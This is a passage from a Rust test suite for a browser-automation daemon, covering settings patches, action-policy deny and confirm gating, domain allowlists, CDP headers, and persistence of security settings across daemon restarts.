            .iter()
            .find(|c| c["option"] == "profile")
            .expect("the pending change is reported");
        assert_eq!(profile["applied"], false);
        assert_ne!(resp["data"]["lifecycle"]["relaunchedBrowser"], true);
    }

    #[tokio::test]
    async fn test_policy_denial_leaves_launch_settings_uncommitted() {
        let dir = tempfile::tempdir().unwrap();
        let policy = dir.path().join("policy.json");
        fs::write(&policy, r#"{"default":"allow","deny":["navigate"]}"#).unwrap();
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "settings": { "action-policy": policy.to_str().unwrap(), "profile": "/tmp/p3" }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false, "{resp}");
        assert!(resp["error"].as_str().unwrap().contains("denied"), "{resp}");
        assert_eq!(state.settings.get(Key::Profile), None);
        assert_eq!(
            resp["data"]["lifecycle"]["settings"]["changes"][1]["applied"],
            false
        );
    }

    #[tokio::test]
    async fn test_local_only_settings_do_not_touch_an_attached_session() {
        for target in [
            (Key::Cdp, json!("ws://127.0.0.1:9999/devtools/browser/x")),
            (Key::Provider, json!("browserless")),
            (Key::AutoConnect, json!(true)),
        ] {
            let (_env, mut state) = isolated_state();
            state.settings = Running::defaults();
            state.settings.set(target.0, target.1);
            let patch = patch_with(vec![
                set_to(Key::Args, json!(["--disable-features=Translate"])),
                set_to(Key::Profile, json!("/tmp/p")),
                set_to(Key::UserAgent, json!("ua")),
            ]);

            let outcome = apply_settings_patch(&mut state, &patch, true)
                .await
                .unwrap();

            assert!(!outcome.relaunched_browser);
            assert!(outcome.pending.is_none(), "{:?}", state.settings);
            assert_eq!(outcome.changes.len(), 3);
            assert!(outcome.changes.iter().all(|c| c["effect"] == "ignored"
                && c["applied"] == false
                && c["reason"].is_string()));
            assert_eq!(state.settings.launch_options().profile, None);
        }
    }
    #[tokio::test]
    async fn test_a_launch_rejected_for_containment_is_rejected_whole() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "action": "launch",
            "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
            "allowedDomains": ["example.com"]
        });

        assert!(handle_launch(&cmd, &mut state).await.is_err());

        assert_eq!(state.settings, Running::defaults());
        assert!(state.domain_filter.read().await.is_none());
    }
    fn provider_plugins() -> Value {
        json!([
            {
                "name": "browserbox",
                "command": "agent-browser-plugin-browserbox",
                "capabilities": ["browser.provider"]
            },
            {
                "name": "stealth",
                "command": "agent-browser-plugin-stealth",
                "capabilities": ["launch.mutate"]
            }
        ])
    }

    #[test]
    fn test_launch_policy_follows_the_provider_in_settings() {
        let (_env, _) = isolated_state();
        let mut settings = Running::defaults();
        settings.set(Key::Provider, json!("browserbox"));
        let launch = json!({ "action": "launch", "plugins": provider_plugins() });

        let actions = policy_actions_for_command(&launch, "launch", false, None, None, &settings);

        assert!(actions.contains(&"plugin:browserbox:browser.provider".to_string()));
        assert!(!actions.contains(&"plugin:stealth:launch.mutate".to_string()));

        // A local launch still gates the launch mutators.
        let local =
            policy_actions_for_command(&launch, "launch", false, None, None, &Running::defaults());
        assert!(local.contains(&"plugin:stealth:launch.mutate".to_string()));
        assert!(!local.contains(&"plugin:browserbox:browser.provider".to_string()));

        // A named target wins over the settings, and ios has no plugin provider.
        let named = json!({ "action": "launch", "cdpPort": 9222, "plugins": provider_plugins() });
        let actions = policy_actions_for_command(&named, "launch", false, None, None, &settings);
        assert!(!actions.contains(&"plugin:browserbox:browser.provider".to_string()));
        let mut ios = Running::defaults();
        ios.set(Key::Provider, json!("ios"));
        let actions = policy_actions_for_command(&launch, "launch", false, None, None, &ios);
        assert!(!actions.iter().any(|a| a.starts_with("plugin:browserbox")));
    }

    #[tokio::test]
    async fn test_bare_open_with_a_settings_provider_is_gated_by_policy() {
        let dir = tempfile::tempdir().unwrap();
        for (rule, expect_confirmation) in [("deny", false), ("confirm", true)] {
            let policy = dir.path().join(format!("{rule}.json"));
            fs::write(
                &policy,
                format!(r#"{{"{rule}": ["plugin:browserbox:browser.provider"]}}"#),
            )
            .unwrap();
            let (_env, mut state) = isolated_state();
            state.settings = Running::defaults();
            let cmd = json!({
                "id": "1",
                "action": "launch",
                "plugins": provider_plugins(),
                "settings": {
                    "provider": "browserbox",
                    "action-policy": policy.to_str().unwrap()
                }
            });

            let resp = execute_command(&cmd, &mut state).await;

            if expect_confirmation {
                assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
                assert_eq!(resp["data"]["action"], "plugin:browserbox:browser.provider");
            } else {
                assert_eq!(resp["success"], false, "{resp}");
                assert!(
                    resp["error"].as_str().unwrap().contains("denied by policy"),
                    "{resp}"
                );
            }
            assert!(state.browser.is_none(), "the plugin must not run: {resp}");
            assert_eq!(state.settings.get(Key::Provider), None, "{resp}");
        }
    }
    #[tokio::test]
    async fn test_changed_cdp_headers_replace_the_cached_ones_for_the_endpoint() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let endpoint = "wss://a.example/cdp";
        let first = patch_with(vec![
            set_to(Key::Cdp, json!(endpoint)),
            set_to(Key::CdpHeaders, json!(r#"{"Authorization":"Bearer one"}"#)),
        ]);
        apply_settings_patch(&mut state, &first, true)
            .await
            .unwrap();
        assert_eq!(
            cdp_headers_for(&state, endpoint),
            Some(vec![(
                "Authorization".to_string(),
                "Bearer one".to_string()
            )])
        );

        let changed = patch_with(vec![set_to(
            Key::CdpHeaders,
            json!(r#"{"Authorization":"Bearer two"}"#),
        )]);
        apply_settings_patch(&mut state, &changed, true)
            .await
            .unwrap();
        assert_eq!(
            cdp_headers_for(&state, endpoint),
            Some(vec![(
                "Authorization".to_string(),
                "Bearer two".to_string()
            )])
        );

        let cleared = patch_with(vec![(Key::CdpHeaders, Requested::Default)]);
        apply_settings_patch(&mut state, &cleared, true)
            .await
            .unwrap();
        assert_eq!(cdp_headers_for(&state, endpoint), None);
        assert_eq!(state.cdp_headers, None);
    }
    #[tokio::test]
    async fn test_an_unreadable_state_file_fails_the_command_and_keeps_the_settings() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::Profile, json!("/tmp/previous"));
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "settings": { "storage-state": "/nonexistent/state.json" }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(state.settings.get(Key::StorageState), None, "{resp}");
        assert_eq!(
            state.settings.get(Key::Profile),
            Some(&json!("/tmp/previous"))
        );
        assert!(state.browser.is_none(), "the failed launch is closed");
    }
    #[tokio::test]
    async fn test_a_live_default_timeout_updates_the_stored_config() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.session_id = "timeout-sync".to_string();
        let config = SessionFile::Config.path("timeout-sync");
        fs::create_dir_all(config.parent().unwrap()).unwrap();
        fs::write(&config, r#"{"debug":false,"default_timeout":90000}"#).unwrap();

        let patch = patch_with(vec![set_to(Key::DefaultTimeout, json!(5000))]);
        apply_settings_patch(&mut state, &patch, false)
            .await
            .unwrap();

        assert_eq!(
            crate::connection::running_daemon_default_timeout("timeout-sync"),
            Some(5000)
        );
    }
    #[test]
    fn test_policy_follows_a_provider_switched_through_settings() {
        let (_env, _) = isolated_state();
        let attached = AttachedTarget::CdpPort(9222);
        let mut settings = Running::defaults();
        settings.set(Key::Provider, json!("browserbox"));
        let navigate = json!({ "action": "navigate", "url": "https://example.com", "plugins": provider_plugins() });
        let launch = json!({ "action": "launch", "plugins": provider_plugins() });

        for (cmd, action, implicit) in [(&navigate, "navigate", true), (&launch, "launch", false)] {
            let actions =
                policy_actions_for_command(cmd, action, implicit, Some(&attached), None, &settings);
            assert!(
                actions.contains(&"plugin:browserbox:browser.provider".to_string()),
                "{action}: {actions:?}"
            );
        }
        // Without a settings target the attachment still decides.
        let attached = AttachedTarget::Provider("browserbox".to_string());
        let actions = policy_actions_for_command(
            &navigate,
            "navigate",
            true,
            Some(&attached),
            None,
            &Running::defaults(),
        );
        assert!(actions.contains(&"plugin:browserbox:browser.provider".to_string()));
    }

    #[tokio::test]
    async fn test_switching_an_attached_session_to_a_provider_is_gated_by_policy() {
        let dir = tempfile::tempdir().unwrap();
        for (rule, expect_confirmation) in [("deny", false), ("confirm", true)] {
            let policy = dir.path().join(format!("{rule}.json"));
            fs::write(
                &policy,
                format!(r#"{{"{rule}": ["plugin:browserbox:browser.provider"]}}"#),
            )
            .unwrap();
            let (_env, mut state) = isolated_state();
            state.settings = Running::defaults();
            state.settings.set(Key::Cdp, json!("9222"));
            state.attached_target = Some(AttachedTarget::CdpPort(9222));
            let cmd = json!({
                "id": "1",
                "action": "navigate",
                "url": "about:blank",
                "plugins": provider_plugins(),
                "settings": {
                    "provider": "browserbox",
                    "action-policy": policy.to_str().unwrap()
                }
            });

            let resp = execute_command(&cmd, &mut state).await;

            if expect_confirmation {
                assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
                assert_eq!(resp["data"]["action"], "plugin:browserbox:browser.provider");
            } else {
                assert!(
                    resp["error"].as_str().unwrap().contains("denied by policy"),
                    "{resp}"
                );
            }
            assert!(state.browser.is_none(), "the provider must not run: {resp}");
            assert_eq!(state.settings.get(Key::Provider), None, "{resp}");
            assert_eq!(state.settings.get(Key::Cdp), Some(&json!("9222")));
            assert_eq!(state.attached_target, Some(AttachedTarget::CdpPort(9222)));
        }
    }

    #[tokio::test]
    async fn test_bare_open_with_an_unreadable_state_file_fails() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::Profile, json!("/tmp/previous"));
        let cmd = json!({
            "id": "1",
            "action": "launch",
            "settings": { "storage-state": "/nonexistent/state.json" }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(state.settings.get(Key::StorageState), None, "{resp}");
        assert_eq!(
            state.settings.get(Key::Profile),
            Some(&json!("/tmp/previous"))
        );
        assert!(state.browser.is_none(), "the failed launch is closed");
    }
    #[tokio::test]
    async fn test_failed_attach_from_the_spawn_env_does_not_stick() {
        let cases = [
            ("AGENT_BROWSER_CDP", "invalid-cdp-target", "cdp"),
            (
                "AGENT_BROWSER_PROVIDER",
                "not-a-provider-for-test",
                "provider",
            ),
        ];
        for (var, value, key) in cases {
            let names = [
                "AGENT_BROWSER_CDP",
                "AGENT_BROWSER_CDP_HEADERS",
                "AGENT_BROWSER_AUTO_CONNECT",
                "AGENT_BROWSER_PROVIDER",
                "AGENT_BROWSER_EXECUTABLE_PATH",
                "AGENT_BROWSER_ENGINE",
                "AGENT_BROWSER_PROFILE",
                "AGENT_BROWSER_STATE",
                "AGENT_BROWSER_SESSION_NAME",
                "AGENT_BROWSER_SOCKET_DIR",
            ];
            let guard = EnvGuard::new(&names);
            for name in names {
                guard.remove(name);
            }
            let dir = tempfile::tempdir().unwrap();
            guard.set("AGENT_BROWSER_SOCKET_DIR", dir.path().to_str().unwrap());
            guard.set(var, value);
            guard.set("AGENT_BROWSER_EXECUTABLE_PATH", "/nonexistent/chrome");
            let mut state = DaemonState::new();

            let first = json!({
                "id": "1",
                "action": "navigate",
                "url": "about:blank",
                "settings": { key: value }
            });
            let resp = execute_command(&first, &mut state).await;
            assert_eq!(resp["success"], false, "{resp}");
            assert_eq!(state.settings.connection(), Connection::Local, "{resp}");

            let plain = json!({ "id": "2", "action": "navigate", "url": "about:blank" });
            let resp = execute_command(&plain, &mut state).await;
            let error = resp["error"].as_str().unwrap_or_default();
            assert!(
                error.contains("Auto-launch failed") || error.contains("nonexistent"),
                "{var}: a plain command must launch locally: {resp}"
            );
            assert!(!error.contains("CDP connection failed"), "{var}: {resp}");
            assert!(!error.contains("not-a-provider-for-test"), "{var}: {resp}");
        }
    }

    #[tokio::test]
    async fn test_resetting_auto_connect_returns_the_session_to_a_local_launch() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::AutoConnect, json!(true));
        state.attached_target = Some(AttachedTarget::AutoConnect);
        let patch = patch_with(vec![(Key::AutoConnect, Requested::Default)]);

        let outcome = apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        assert_eq!(state.settings.connection(), Connection::Local);
        assert_eq!(state.attached_target, None);
        assert!(outcome.pending.is_some(), "the local launch is pending");
        assert_eq!(outcome.changes.len(), 1);
        assert_eq!(outcome.changes[0]["option"], "auto-connect");
        assert_eq!(outcome.changes[0]["requested"], Value::Null);
        assert_eq!(outcome.changes[0]["running"], json!(true));
    }

    #[tokio::test]
    async fn test_failed_local_launch_after_an_auto_connect_reset_restores_the_target() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::AutoConnect, json!(true));
        state.attached_target = Some(AttachedTarget::AutoConnect);
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "settings": { "auto-connect": null, "executable-path": "/nonexistent/chrome" }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(state.settings.connection(), Connection::AutoConnect);
        assert_eq!(state.attached_target, Some(AttachedTarget::AutoConnect));
    }

    #[tokio::test]
    async fn test_resetting_to_a_local_launch_gates_the_launch_mutators() {
        let dir = tempfile::tempdir().unwrap();
        let policy = dir.path().join("deny.json");
        fs::write(&policy, r#"{"deny": ["plugin:stealth:launch.mutate"]}"#).unwrap();
        // `-p ""` and a raw null both reset the session to a local launch.
        for reset in [json!({ "provider": "" }), json!({ "cdp": null })] {
            let (_env, mut state) = isolated_state();
            state.settings = Running::defaults();
            state.settings.set(Key::Cdp, json!("9222"));
            state.attached_target = Some(AttachedTarget::CdpPort(9222));
            let mut settings = reset.clone();
            settings["action-policy"] = json!(policy.to_str().unwrap());
            let cmd = json!({
                "id": "1",
                "action": "navigate",
                "url": "about:blank",
                "plugins": provider_plugins(),
                "settings": settings
            });

            let resp = execute_command(&cmd, &mut state).await;

            assert!(
                resp["error"]
                    .as_str()
                    .is_some_and(|e| e.contains("denied by policy")),
                "{reset}: {resp}"
            );
            assert!(state.browser.is_none());
            assert_eq!(
                state.settings.get(Key::Cdp),
                Some(&json!("9222")),
                "not committed"
            );
        }
    }

    #[test]
    fn test_an_empty_provider_names_no_browser() {
        let mut settings = Running::defaults();
        settings.set(Key::Provider, json!(""));
        assert_eq!(settings.connection(), Connection::Local);
        assert!(settings_launch_target(&settings).is_none());
    }

    #[tokio::test]
    async fn test_an_external_launch_installs_no_proxy_credentials() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        // Inherited local launch settings that a stale session could carry.
        state.settings.set(Key::ProxyUsername, json!("user"));
        state.settings.set(Key::ProxyPassword, json!("pw"));
        state
            .settings
            .set(Key::StorageState, json!("/tmp/state.json"));
        state.settings.set(Key::Cdp, json!("1"));
        *state.proxy_credentials.write().await = Some(("old".to_string(), "old".to_string()));

        // Nothing listens on port 1, so the attach fails; the credentials are
        // decided before it is tried.
        assert!(auto_launch(&mut state, Vec::new()).await.is_err());

        assert!(state.proxy_credentials.read().await.is_none());
    }

    #[tokio::test]
    async fn test_switching_to_an_external_browser_drops_inherited_local_settings() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state
            .settings
            .set(Key::StorageState, json!("/tmp/state.json"));
        state.settings.set(Key::ProxyUsername, json!("user"));
        state.settings.set(Key::ProxyPassword, json!("pw"));

        let patch = patch_with(vec![set_to(Key::Cdp, json!("ws://127.0.0.1:9999/x"))]);
        let outcome = apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        let options = state.settings.launch_options();
        assert_eq!(options.storage_state, None);
        assert_eq!(options.proxy_username, None);
        assert_eq!(options.proxy_password, None);
        let dropped: Vec<&str> = outcome
            .changes
            .iter()
            .filter(|c| c["effect"] == "ignored")
            .filter_map(|c| c["option"].as_str())
            .collect();
        assert!(dropped.contains(&"storage-state") && dropped.contains(&"proxy-password"));
    }
    #[test]
    fn test_blank_targets_name_no_browser_anywhere() {
        for cmd in [
            json!({ "action": "launch", "cdpUrl": "" }),
            json!({ "action": "launch", "cdpUrl": "  " }),
            json!({ "action": "launch", "cdpPort": 0 }),
            json!({ "action": "launch", "provider": " " }),
            json!({ "action": "launch", "autoConnect": false }),
        ] {
            assert_eq!(AttachedTarget::named_by(&cmd), None, "{cmd}");
            assert_eq!(AttachedTarget::from_launch_command(&cmd), None, "{cmd}");
            assert!(launch_envelope_patch(&cmd, None).is_noop(), "{cmd}");
        }
        let mut settings = Running::defaults();
        settings.set(Key::Cdp, json!(" "));
        settings.set(Key::Provider, json!(""));
        assert_eq!(settings.connection(), Connection::Local);
        assert!(settings_launch_target(&settings).is_none());
    }

    #[tokio::test]
    async fn test_a_launch_with_a_blank_cdp_url_is_gated_as_local() {
        let dir = tempfile::tempdir().unwrap();
        let policy = dir.path().join("deny.json");
        fs::write(&policy, r#"{"deny": ["plugin:stealth:launch.mutate"]}"#).unwrap();
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "id": "1",
            "action": "launch",
            "cdpUrl": "",
            "plugins": provider_plugins(),
            "settings": { "action-policy": policy.to_str().unwrap() }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert!(
            resp["error"]
                .as_str()
                .is_some_and(|e| e.contains("denied by policy")),
            "{resp}"
        );
        assert!(state.browser.is_none());
        assert_eq!(state.attached_target, None);
    }

    #[tokio::test]
    async fn test_a_failed_switch_to_an_external_target_keeps_the_local_settings() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let before = [
            (Key::StorageState, json!("/tmp/state.json")),
            (Key::Proxy, json!("http://proxy:8080")),
            (Key::ProxyUsername, json!("user")),
            (Key::ProxyPassword, json!("pw")),
        ];
        for (key, value) in &before {
            state.settings.set(*key, value.clone());
        }
        // State the attempt replaces: the switch drops the attached target and
        // the endpoint's headers, and clearing CA trust drops the bundle.
        state.settings.set(Key::CaCert, json!("/tmp/ca.pem"));
        state.effective_ca_cert = Some(EffectiveCaCert {
            path: "/tmp/ca.pem".to_string(),
            bundle: crate::ca_bundle::test_bundle(b"ca"),
        });
        state.attached_target = Some(AttachedTarget::CdpPort(9222));
        state.cdp_headers = Some((
            "9222".to_string(),
            vec![("Authorization".to_string(), "Bearer a".to_string())],
        ));
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "settings": { "cdp": "1", "clear-ca-cert": true }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(state.settings.get(Key::Cdp), None);
        for (key, value) in &before {
            assert_eq!(state.settings.get(*key), Some(value), "{key:?}");
        }
        assert_eq!(
            state.effective_ca_cert.as_ref().map(|ca| ca.path.as_str()),
            Some("/tmp/ca.pem")
        );
        assert!(matches!(
            state.attached_target,
            Some(AttachedTarget::CdpPort(9222))
        ));
        assert_eq!(
            state.cdp_headers,
            Some((
                "9222".to_string(),
                vec![("Authorization".to_string(), "Bearer a".to_string())],
            ))
        );
    }

    #[test]
    fn test_an_inherited_engine_does_not_label_an_attached_browser() {
        let mut settings = Running::defaults();
        settings.set(Key::Engine, json!("lightpanda"));
        // CDP and auto-connect drop it; a plugin provider keeps it.
        for target in [
            (Key::Cdp, json!("ws://127.0.0.1:9999/x")),
            (Key::AutoConnect, json!(true)),
        ] {
            let plan = settings.plan(&patch_with(vec![set_to(target.0, target.1)]));
            assert_eq!(plan.next.engine(), None);
        }
        let plan = settings.plan(&patch_with(vec![set_to(
            Key::Provider,
            json!("browserbox"),
        )]));
        assert_eq!(plan.next.engine().as_deref(), Some("lightpanda"));
    }

    #[tokio::test]
    async fn test_attaching_over_cdp_never_labels_the_browser_with_the_engine() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::Engine, json!("lightpanda"));
        state.settings.set(Key::Cdp, json!("1"));

        // Nothing listens on port 1; the label is set before the attach.
        assert!(auto_launch(&mut state, Vec::new()).await.is_err());

        assert_eq!(state.engine, "chrome");
    }

    // === Security settings kept across daemon restarts ===

    use crate::session_settings::{FsStore, MemStore, SecurityView, StoreError};
    use std::sync::atomic::{AtomicUsize, Ordering};

    /// A store that counts saves and can start failing them.
    struct FlakyStore {
        inner: MemStore,
        saves: AtomicUsize,
        fail_from: usize,
    }

    impl FlakyStore {
        fn new(fail_from: usize) -> Arc<FlakyStore> {
            Arc::new(FlakyStore {
                inner: MemStore::default(),
                saves: AtomicUsize::new(0),
                fail_from,
            })
        }

        fn counting() -> Arc<FlakyStore> {
            FlakyStore::new(usize::MAX)
        }

        fn saves(&self) -> usize {
            self.saves.load(Ordering::SeqCst)
        }
    }

    impl Store for FlakyStore {
        fn load(&self) -> Result<Option<SecurityView>, StoreError> {
            self.inner.load()
        }

        fn save(&self, view: &SecurityView) -> Result<(), StoreError> {
            let attempt = self.saves.fetch_add(1, Ordering::SeqCst);
            if attempt >= self.fail_from {
                return Err(StoreError::PersistFailed("disk full".to_string()));
            }
            self.inner.save(view)
        }

        fn clear(&self) -> Result<(), StoreError> {
            self.inner.clear()
        }
    }

    fn write_private(path: &std::path::Path, contents: &str) {
        fs::write(path, contents).unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(path, fs::Permissions::from_mode(0o600)).unwrap();
        }
    }

    /// A daemon start for `session`: the settings come from `store`, as in
    /// `run_daemon`.
    fn boot_state(store: Arc<dyn Store>, session: &str) -> DaemonState {
        let settings = Running::boot(store.as_ref(), session).unwrap();
        DaemonState::with_store(settings, store)
    }

    fn domains(list: &[&str]) -> (Key, Requested) {
        set_to(Key::AllowedDomains, json!(list))
    }

    fn security_patch(policy_path: &str) -> Patch {
        patch_with(vec![
            domains(&["example.com"]),
            set_to(Key::ActionPolicy, json!(policy_path)),
            set_to(Key::ConfirmActions, json!("navigate,click")),
        ])
    }

    #[tokio::test]
    async fn test_a_stored_empty_domain_list_restores_as_no_filter() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        write_private(&dir.path().join("s.settings"), r#"{"allowedDomains":[]}"#);
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));

        let state = boot_state(store, "s");

        assert!(state.domain_filter.read().await.is_none());
    }

    #[tokio::test]
    async fn test_a_respawned_daemon_keeps_the_filter_policy_and_confirm_categories() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let policy = dir.path().join("policy.json");
        fs::write(&policy, r#"{"default":"deny"}"#).unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
        let mut first = DaemonState::with_store(Running::defaults(), store.clone());
        let patch = security_patch(policy.to_str().unwrap());
        apply_settings_patch(&mut first, &patch, true)
            .await
            .unwrap();
        drop(first);

        // A new process over the same files, with no flags and an empty env.
        let second = boot_state(store.clone(), "s");

        assert_eq!(current_allowed_domains(&second).await, vec!["example.com"]);
        assert!(second.policy.is_some(), "the action policy is back");
        assert!(
            second.confirm_actions.is_some(),
            "the confirm categories are back"
        );
        assert_eq!(
            second.settings.security().action_policy_path.as_deref(),
            policy.to_str(),
            "the policy path is kept as given"
        );
    }

    #[tokio::test]
    async fn test_a_respawned_daemon_still_rejects_state_while_the_filter_is_active() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
        let mut first = DaemonState::with_store(Running::defaults(), store.clone());
        apply_settings_patch(
            &mut first,
            &patch_with(vec![domains(&["example.com"])]),
            true,
        )
        .await
        .unwrap();
        drop(first);

        let mut second = boot_state(store, "s");

        let replay = ensure_state_replay_supported_by_active_domain_filter(&second, "state load")
            .await
            .unwrap_err();
        assert!(
            replay.contains("--allowed-domains is not supported"),
            "{replay}"
        );
        let launch = json!({ "action": "launch", "storageState": "/tmp/s.json" });
        let err = handle_launch(&launch, &mut second).await.unwrap_err();
        assert!(
            err.contains("--allowed-domains is not supported with --state"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_a_restart_without_close_keeps_the_stored_settings() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
        let mut first = boot_state(store.clone(), "s");
        apply_settings_patch(
            &mut first,
            &patch_with(vec![domains(&["example.com"])]),
            true,
        )
        .await
        .unwrap();

        // Idle expiry, a crash and a kill all end the process without `close`.
        drop(first);
        drop(boot_state(store.clone(), "s"));
        let third = boot_state(store.clone(), "s");

        assert_eq!(current_allowed_domains(&third).await, vec!["example.com"]);
        assert!(dir.path().join("s.settings").exists());
    }

    #[tokio::test]
    async fn test_close_clears_the_stored_settings() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
        let mut first = boot_state(store.clone(), "s");
        apply_settings_patch(
            &mut first,
            &patch_with(vec![domains(&["example.com"])]),
            true,
        )
        .await
        .unwrap();
        assert!(dir.path().join("s.settings").exists());

        let reply = handle_close(&mut first).await.unwrap();

        assert_eq!(reply["closed"], true, "{reply}");
        assert!(reply.get("settingsClearError").is_none(), "{reply}");
        assert!(!dir.path().join("s.settings").exists());
        let next = boot_state(store, "s");
        assert!(next.domain_filter.read().await.is_none());
    }

    #[tokio::test]
    async fn test_the_internal_shutdown_of_a_restart_keeps_the_stored_settings() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
        let mut first = boot_state(store.clone(), "s");
        apply_settings_patch(
            &mut first,
            &patch_with(vec![domains(&["example.com"])]),
            true,
        )
        .await
        .unwrap();

        // What ensure_daemon sends before it starts a replacement daemon.
        let resp = execute_command(
            &json!({ "id": "restart-close", "action": INTERNAL_DAEMON_SHUTDOWN_ACTION }),
            &mut first,
        )
        .await;

        assert_eq!(resp["success"], true, "{resp}");
        assert!(dir.path().join("s.settings").exists());
        let next = boot_state(store, "s");
        assert_eq!(current_allowed_domains(&next).await, vec!["example.com"]);
    }

    /// A state holding an allowlist and a policy file with `policy`.
    async fn contained_state_with_policy(
        dir: &std::path::Path,
        policy: &str,
    ) -> (DaemonState, Arc<dyn Store>) {
        let file = dir.join("policy.json");
        fs::write(&file, policy).unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir, "s"));
        let mut state = boot_state(store.clone(), "s");
        let patch = patch_with(vec![
            domains(&["example.com"]),
            set_to(Key::ActionPolicy, json!(file.to_str().unwrap())),
        ]);
        apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();
        (state, store)
    }

    #[tokio::test]
    async fn test_a_close_denied_by_policy_keeps_the_stored_settings() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let (mut state, _) = contained_state_with_policy(dir.path(), r#"{"deny":["close"]}"#).await;

        let resp = execute_command(&json!({ "id": "1", "action": "close" }), &mut state).await;

        assert_eq!(resp["success"], false, "{resp}");
        assert!(dir.path().join("s.settings").exists());
    }

    #[tokio::test]
    async fn test_a_close_parked_for_confirmation_keeps_the_settings_until_confirmed() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let (mut state, _) =
            contained_state_with_policy(dir.path(), r#"{"confirm":["close"]}"#).await;

        let parked = execute_command(&json!({ "id": "1", "action": "close" }), &mut state).await;
        assert_eq!(parked["data"]["confirmation_required"], true, "{parked}");
        assert!(dir.path().join("s.settings").exists());

        let confirmed =
            execute_command(&json!({ "id": "2", "action": "confirm" }), &mut state).await;
        assert_eq!(confirmed["success"], true, "{confirmed}");
        assert!(!dir.path().join("s.settings").exists());
    }

    #[tokio::test]
    async fn test_close_clears_a_file_the_daemon_could_not_read() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
        write_private(&dir.path().join("s.settings"), "{not json");
        assert!(Running::boot(store.as_ref(), "s").is_err());
        let mut state = DaemonState::with_store(Running::defaults(), store.clone());

        handle_close(&mut state).await.unwrap();

        assert!(Running::boot(store.as_ref(), "s").is_ok());
    }

    #[tokio::test]
    async fn test_an_unchanged_value_does_not_write() {
        let (_env, _) = isolated_state();
        let store = FlakyStore::counting();
        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
        let patch = patch_with(vec![domains(&["example.com"])]);

        apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();
        assert_eq!(store.saves(), 1);
        apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();
        apply_settings_patch(&mut state, &Patch::default(), true)
            .await
            .unwrap();
        let other = patch_with(vec![set_to(Key::UserAgent, json!("ua"))]);
        apply_settings_patch(&mut state, &other, true)
            .await
            .unwrap();

        assert_eq!(store.saves(), 1, "only the first change was written");
    }

    #[tokio::test]
    async fn test_a_launch_rejected_for_containment_restores_the_stored_value() {
        let (_env, _) = isolated_state();
        let store = FlakyStore::counting();
        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
        apply_settings_patch(&mut state, &patch_with(vec![domains(&["a.com"])]), true)
            .await
            .unwrap();
        let cmd = json!({
            "action": "launch",
            "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
            "allowedDomains": ["b.com"]
        });

        assert!(handle_launch(&cmd, &mut state).await.is_err());

        assert_eq!(current_allowed_domains(&state).await, vec!["a.com"]);
        let stored = store.load().unwrap().unwrap();
        assert_eq!(stored.allowed_domains, Some(vec!["a.com".to_string()]));
    }

    #[tokio::test]
